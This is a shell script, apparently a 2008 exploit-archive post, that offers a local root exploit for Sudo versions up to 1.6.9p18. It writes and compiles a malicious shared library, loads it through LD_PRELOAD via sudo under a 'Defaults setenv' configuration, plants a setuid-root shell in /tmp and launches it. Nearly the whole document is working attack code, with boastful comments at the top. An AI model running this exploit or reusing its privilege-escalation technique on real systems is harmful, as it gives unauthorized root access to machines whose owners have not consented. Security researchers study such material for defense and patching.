#!/bin/sh
#* Sudo <= 1.6.9p18 local r00t exploit
#* by Kingcope/2008/www.com-winner.com
#
# Most lame exploit EVER!
#
# Needs a special configuration in the sudoers file:
# --->>>>> "Defaults setenv" so environ vars are preserved :) <<<<<---
#
# May also need the current users password to be typed in
# So this exploit is UBERLAME!
# First Argument to this shell file: A program your current
# user is allowed to execute via sudo. sudo has to be in
# the path!!
# successfully tested on FreeBSD-7.0 and RedHat Linux
# I don't even know why I realease such stuffz
# I'M GONNA GRAB A COFFE NOW;HAVE PHUN !!!

echo "Sudo <= 1.6.9p18 local r00t exploit"
echo "by Kingcope/2008/www.com-winner.com"

if [$1 == ""]; then
echo "Please give me a program to run via sudo."
echo "Allowed programs:"
sudo -l
exit
fi

cat > program.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
 if (!geteuid()) {
 unsetenv("LD_PRELOAD");
 setgid(0);
 setuid(0);
 execl("/bin/sh","sh","-c","chown 0:0 /tmp/xxxx; /bin/chmod +xs /tmp/xxxx",NULL);
 }
}

_EOF

cat > xxxx.c << _EOF
int main(void) {
       setgid(0); setuid(0);
//       unlink("/tmp/xxxx");
       execl("/bin/sh","sh",0); }
_EOF

gcc -o /tmp/xxxx xxxx.c
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,libno_ex.so.1 -o /tmp/libno_ex.so.1.0 program.o -nostartfiles
sudo LD_PRELOAD=/tmp/libno_ex.so.1.0 $1
if [ -f /tmp/xxxx ]; then
echo "CONGRATULATIONS, IT'S A ROOTSHELL!"
/tmp/xxxx
else
echo "Sorry, exploit failed. No envvars allowed?"
fi

# milw0rm.com [2008-11-15]